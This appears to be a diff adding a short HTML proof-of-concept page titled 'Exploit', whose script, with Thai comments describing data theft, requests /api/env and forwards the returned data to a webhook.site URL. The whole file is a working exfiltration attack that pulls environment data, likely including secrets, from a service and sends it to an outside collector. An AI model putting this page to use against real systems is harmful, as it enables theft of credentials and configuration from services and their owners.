@@ -1,0 +1,17 @@
+!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit</title>
+</head>
+<body>
+<script>
+    // สงคำขอ GET ไปยง /api/env เพอขโมยขอมล
+    fetch('/api/env')
+        .then(res => res.json())
+        .then(data => {
+            // สงขอมลทไดไปยง Webhook.site
+            fetch('https://webhook.site/unique-id?data=' + encodeURIComponent(JSON.stringify(data)));
+        });
+</script>
+</body>
+</html>
